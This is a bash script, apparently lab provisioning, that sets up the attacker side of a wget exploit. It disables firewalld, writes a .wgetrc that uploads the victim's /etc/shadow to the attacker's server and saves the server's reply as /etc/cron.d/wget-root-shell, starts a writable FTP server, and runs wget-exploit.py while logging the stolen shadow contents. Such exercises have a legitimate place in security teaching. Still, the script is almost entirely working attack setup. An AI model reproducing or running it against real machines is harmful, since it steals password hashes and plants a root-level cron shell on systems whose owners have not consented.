#!/bin/bash
sudo systemctl stop firewalld

# creating the .wgetrc file 
# /etc/shadow will be sent back to the attacker's server through the post request 
# /etc/cron.d/wget-root-shell will be created upon the receive of response from attacker's server
# with content specified by the attacker
mkdir /tmp/ftptest
cd /tmp/ftptest
cat <<_EOF_>>.wgetrc
post_file = /etc/shadow
output_document = /etc/cron.d/wget-root-shell
_EOF_
# installing pythonftpdlib package 
sudo dnf install -y pyftpdlib
# configure ftp server and starting it in the background 
# -m specifies the module name; -p port; -w write access
sudo python -m pyftpdlib -p21 -w &
# wait for fptserver to be started 
sleep 5
# redirection to save client's /etc/shadow which contains confidential information
sudo python /vagrant/provision/wget-exploit.py > /vagrant/data/exploit-output-2.txt 2>&1 &
